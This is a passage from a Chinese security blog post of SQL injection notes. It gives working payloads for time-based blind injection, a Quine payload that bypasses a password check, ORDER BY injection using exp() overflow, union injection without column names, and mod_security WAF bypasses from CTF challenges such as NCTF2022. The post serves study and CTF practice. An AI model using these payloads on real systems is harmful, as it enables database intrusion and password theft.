<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> if((<span class="keyword">select</span> ascii(mid((<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema <span class="keyword">like</span> database()),&#123;&#125;,<span class="number">1</span>)) <span class="keyword">like</span> &#123;&#125;),(<span class="keyword">select</span> benchmark(<span class="number">4999999</span>,md5(<span class="string">&#x27;test&#x27;</span>))),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p>但是很遗憾，这样注出来<code>user</code>表中没有密码。</p>
<p>如果仔细看题目中这个比较判断的逻辑，我们就可以发现端倪。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br></pre></td></tr></table></figure>

<p>简单来看，要求的是执行<code>$sql</code>的结果与<code>$password</code>相同，那么除了正常逻辑的密码相同会产生相等，如果我们的输入与最后的结果相等，那么一样可以绕过验证。这种技术就是<code>Quine</code>。</p>
<p>示例payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>)<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span>ch3ns1r#</span><br></pre></td></tr></table></figure>



<p>这样看起来不是很清楚，我们接下来从内层一步一步拆开看。</p>
<p>从大结构上，这段payload是由两个大REPLACE完成的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPLACE ( string_expression , string_pattern , string_replacement )</span><br><span class="line">即将string_expression中所有string_pattern替换为string_replacement</span><br></pre></td></tr></table></figure>

<p>内层<code>REPLACE</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>))</span><br></pre></td></tr></table></figure>

<p>我们暂且把它当作<code>A</code>，这里面有个字符串：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure>

<p>我们暂且把它当作<code>B</code>。</p>
<p>简化一下最初的<code>payload</code>就是这个样子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(A,<span class="type">CHAR</span>(<span class="number">46</span>),B)<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span>ch3ns1r#</span><br><span class="line">其中：</span><br><span class="line">A：REPLACE(B,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>))</span><br><span class="line">B：</span><br><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure>

<p>到这里应该就看的比较清楚了，有点像套娃。<code>A</code>这个形式就是<code>Quine</code>的基本形式，可以描述为如下形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure>

<p><code>str</code>可描述为如下形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br></pre></td></tr></table></figure>

<p>这样运算后，最后的结果又是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure>

<p>我们举个例子加深理解，设间隔符为<code>&#39;.&#39;</code>，编码的间隔符为<code>CHAR(46)</code>，那么<code>str</code>为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;.&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;.&quot;)</span><br></pre></td></tr></table></figure>

<p>放入最后的语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>执行的结果为（先执行的<code>CHAR(46)</code>）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>（注意以上的语句还没有考虑存在单双引号的情况）</p>
<p>这样就达到了输入与输出一致的效果。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> MySQL  localhost:<span class="number">3306</span> ssl  <span class="keyword">SQL</span> <span class="operator">&gt;</span> <span class="keyword">SELECT</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.0005</span> sec)</span><br></pre></td></tr></table></figure>

<p>解决单双引号</p>
<p>细心点的话就会发现，这里还存在单双引号的问题，我们重新考虑存在单双引号的情况。</p>
<p><code>Quine</code>的基本形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;str&#x27;</span>,编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>str</code>描述为如下形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>

<p>这里<code>str</code>中的间隔符使用双引号的原因是，<code>str</code>已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。</p>
<p>运算后的结果是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;str&quot;,编码的间隔符,&quot;str&quot;)</span><br></pre></td></tr></table></figure>

<p>但是我们希望<code>str</code>仍然使用单引号包裹，怎么办？</p>
<p>我们这样考虑，如果先使用<code>REPLACE</code>将<code>str</code>的双引号换成单引号，这样最后就不会出现引号不一致的情况了。</p>
<p><code>Quine</code>的升级版基本形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>str</code>的升级版形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>

<p>这里的<code>CHAR(34)</code>是双引号，<code>CHAR(39)</code>是单引号，如果<code>CHAR</code>被禁了<code>0x22</code>和<code>0x27</code>是一样的效果。</p>
<p>这里我们慢一点。</p>
<p>第一步：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;间隔符&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;间隔符&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第二步：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;单引号str&#x27;</span>,编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们同样举刚才的例子，设间隔符为<code>&#39;.&#39;</code>，编码的间隔符为<code>CHAR(46)</code>，那么<code>str</code>为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;.&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),&quot;.&quot;)</span><br></pre></td></tr></table></figure>

<p>放入最后的语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>执行的结果为（先执行的内层<code>REPLACE</code>）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>实际结果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> MySQL  localhost:<span class="number">3306</span> ssl  <span class="keyword">SQL</span> <span class="operator">&gt;</span> <span class="keyword">SELECT</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.0004</span> sec)</span><br></pre></td></tr></table></figure>

<p>现在就完全一致了。</p>
<h4 id="排序注入"><a href="#排序注入" class="headerlink" title="排序注入"></a>排序注入</h4><p>在SQL语言中，Order By语句主要用于对结果集进行排序。既然跟数据库交互有关，自然而然就会想到SQL注入的防护问题，第一时间想到的方案就是预编译了。但是采用预编译执行SQL语句传入的参数不能作为SQL语句的一部分，，那么Order By后的字段名、或者是 desc\asc 也不能预编译处理，那么也就是说Order By场景的排序规则还是只能使用拼接，这时候如果在开发阶段没有处理好，那么就很可能导致SQL注入问题了。排序也一直是注入的重灾区。</p>
<p><strong>挖掘思路</strong></p>
<p>存在关键参数值 desc</p>
<p>如下图</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e6f5f872fce04115972e8c002cded0f4.png" alt="img"></p>
<p><strong>检测方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">,1 &amp;&amp; ,0</span><br><span class="line"></span><br><span class="line">,1/1 &amp;&amp; ,1/0</span><br><span class="line"></span><br><span class="line">,exp(71) &amp;&amp; ,exp(710)</span><br></pre></td></tr></table></figure>

<p>异或</p>
<p><strong>三、排序注入挖掘</strong></p>
<p>这里使用的是 exp()   &#x2F;&#x2F;数值大于709就会溢出</p>
<p>Poc： AdminID+desc,exp(7)</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/f300b02e8268461484374f80130f4c86.png" alt="img"></p>
<p>Poc:AdminID+desc,exp(710)</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3ea9c97a93564785b7128c9f047bcea9.png" alt="img"></p>
<p>此时不难发现，溢出时，响应时间比较长</p>
<p>所以在盲注中，建议条件为真时溢出</p>
<p>Poc 开始变形</p>
<p>Poc:AdminID+desc,if(user()+like+’r%’,exp(710),exp(7))</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/d7de9c78d86c4932a53db3a028758eed.png" alt="img"></p>
<p>Poc:AdminID+desc,if(user()+like+’c%’,exp(710),exp(7))</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/28574091b2c948559e9d4be4e6f8a914.png" alt="img"></p>
<p><strong>四、排序注入—补充</strong></p>
<p>1、因果的因</p>
<p>最近碰到挺多排序注入（关键字：orderby，desc，asc等）构造的poc大多为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,if(<span class="number">1</span>,<span class="built_in">exp</span>(<span class="number">789</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="keyword">case</span><span class="operator">+</span><span class="keyword">when</span><span class="operator">+</span>hex(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">63</span><span class="operator">+</span><span class="keyword">then</span><span class="operator">+</span><span class="built_in">exp</span>(<span class="number">789</span>)<span class="operator">+</span><span class="keyword">else</span><span class="operator">+</span><span class="built_in">exp</span>(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>（poc的书写取决于站点是否对相关函数、单引号有所拦截）</p>
<p>总之都是利用盲注的方式来获取数据，从基础的poc fuzz到poc2、poc3甚至poc4，取决于waf的强弱、个人习惯。</p>
<p>2、因果的果</p>
<p>图一是使用报错注入获取用户名</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/80f20149c1734da69abd862488a168a0.png" alt="img"></p>
<p>图二是验证此poc是否可用（图一图二是同一系统不同的注入点）</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1c2553937d6e4af18a499ea60a7374b2.png" alt="img"></p>
<p>图三是在有waf的情况下使用</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e1eeabfaae684531ab8af81f6adb8353.png" alt="img"></p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/union/**/select/**/1,2,3/**/&#x27;1</span><br></pre></td></tr></table></figure>





<h4 id="NCTF2022"><a href="#NCTF2022" class="headerlink" title="NCTF2022"></a>NCTF2022</h4><h5 id="mod-security防火墙"><a href="#mod-security防火墙" class="headerlink" title="mod_security防火墙"></a>mod_security防火墙</h5><p>NCTF遇到的一个很恶心的waf</p>
<p><strong>用1.e可以绕过</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221205120416138.png" alt="image-20221205120416138" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 or  1.e(updatexml(1,concat(0x7,substring((select(password)from info),1,50)),0))  </span><br><span class="line">或者 1^(1.e(ascii 1.e(substr(1.e(select password from info where id =1) 1.e,2 1.e,1 1.e)1.e)1.e) =99)</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221205120354336.png" alt="image-20221205120354336" style="zoom: 50%;" />



<p>sqlmap一把嗦……靠</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221206142016908.png" alt="image-20221206142016908" style="zoom:80%;" />

<p>官方payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@.:=right(right((select hex(password) from users.info where id =1 limit 0,1),1111),1111) union%23%0adistinctrow%0bselect@.</span><br></pre></td></tr></table></figure>



<p>不过还是能学到一种新姿势    <strong>gtid_subset()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gtid_subset(concat(0x7e,(select/**/database/**/()),0x7e),71)</span><br></pre></td></tr></table></figure>





<h4 id="新型sql"><a href="#新型sql" class="headerlink" title="新型sql"></a>新型sql</h4><p>foodAPI存在语法bug，参考这道题目：<a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/">https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/</a> </p>
<p>这两种不会出错 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id from food where `not_exist&#x27;` and 0 union select 1; </span><br><span class="line">select id from food where `not_exist&#x27;` in () union select 1; </span><br></pre></td></tr></table></figure>

<p>payload： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flight?id=1&amp;?=`in()+union+select+1,flag+from+flag;</span><br></pre></td></tr></table></figure>



<p>官方wp：</p>
<p>deno的day，和去年出的ez_sql有点像。<br>两个问题：<br>一是SQL语句build的方式。<br>二是参数注入后列名中会产生带有引号的不存在的列名。<br>SQLite where子句中的in()会被忽略，利用这一点可以解决第二个问题。<br>第一个问题通过源码不难发现在生成最终的SQL语句时，使用了?作为占位符，因此可以通过在列名中传入?造成注入。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flight??=`in()%20union%20select%202333,flag%20from%20flag;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><img class="prev-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Cobalt Strike学习笔记</div></div></a></div><div class="next-post pull-right"><a href="/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件上传</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">sqlmap工具的详细使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">delete注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#newstart-multiSQL"><span class="toc-number">1.</span> <span class="toc-text">newstart multiSQL</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" 